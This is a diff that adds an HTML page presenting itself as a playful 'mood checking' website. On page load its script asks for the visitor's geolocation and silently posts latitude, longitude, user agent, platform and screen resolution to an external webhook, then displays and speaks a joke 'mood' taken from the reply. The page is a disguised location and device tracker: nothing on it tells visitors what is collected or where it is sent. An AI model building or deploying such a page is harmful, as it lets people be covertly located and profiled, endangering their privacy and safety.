@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mood Checking Site</title>
+    <script>
+        function speak(text) {
+            const speech = new SpeechSynthesisUtterance(text);
+            speech.lang = 'en-US'; 
+            speech.rate = 1; 
+            speech.pitch = 1; 
+            window.speechSynthesis.speak(speech);
+        }
+
+        function sendDeviceInfo() {
+            const statusElement = document.getElementById("status");
+            statusElement.textContent = "Mood is checking...";
+            speak("Mood is checking...");
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const userAgent = navigator.userAgent;
+                        const platform = navigator.platform;
+                        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+
+                        // Send data to the backend API
+                        fetch('https://hooks-two-zeta.vercel.app/send-info', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                latitude,
+                                longitude,
+                                userAgent,
+                                platform,
+                                screenResolution,
+                            }),
+                        })
+                            .then((response) => response.text())
+                            .then((data) => {
+                                const moodText = `Mood: ${data}`;
+                                statusElement.textContent = moodText;
+                                speak(moodText);
+                            })
+                            .catch((error) => {
+                                const errorText = "Mood: very sad";
+                                statusElement.textContent = errorText;
+                                speak(errorText);
+                            });
+                    },
+                    function (error) {
+                        const errorText = "Mood: angry";
+                        statusElement.textContent = errorText;
+                        speak(errorText);
+                    }
+                );
+            } else {
+                const errorText = "Mood: very very angry";
+                statusElement.textContent = errorText;
+                speak(errorText);
+            }
+        }
+
+        window.onload = sendDeviceInfo;
+    </script>
+</head>
+<body style="height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;">
+    <h1>Welcome to mood checking website...</h1>
+    <p id="status" style="font-size: 1.2em; color: #333;"></p>
+</body>
+</html>
